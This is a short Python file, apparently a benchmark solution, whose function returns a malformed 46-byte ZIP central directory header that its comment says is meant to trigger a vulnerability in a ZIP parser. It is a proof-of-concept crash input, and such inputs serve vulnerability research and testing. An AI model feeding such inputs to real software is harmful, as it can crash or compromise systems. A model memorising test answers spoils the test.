import typing

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal ZIP central directory header (46 bytes) intended to trigger the vulnerability
        return b'PK\x01\x02' + b'\x00' * 42
